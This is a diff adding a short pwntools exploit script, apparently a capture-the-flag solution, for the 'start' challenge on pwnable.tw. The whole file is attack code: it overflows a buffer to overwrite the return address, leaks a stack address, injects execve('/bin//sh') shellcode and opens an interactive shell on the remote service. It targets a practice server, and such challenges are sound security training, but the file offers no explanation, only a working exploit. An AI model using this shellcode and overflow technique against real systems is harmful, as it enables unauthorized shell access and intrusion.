@@ -1,0 +1,21 @@
+from pwn import *
+
+conn = remote("chall.pwnable.tw", 10000)
+
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
+
+payload = 'a' * 20 + p32(0x08048087)
+
+print conn.recvuntil(":")
+
+conn.send(payload)
+
+message=conn.recv(20)[0:4]
+
+stack=u32(message)
+
+payload_next="A"*20+p32(stack+0x14)+shellcode
+
+conn.sendline(payload_next)
+
+conn.interactive()
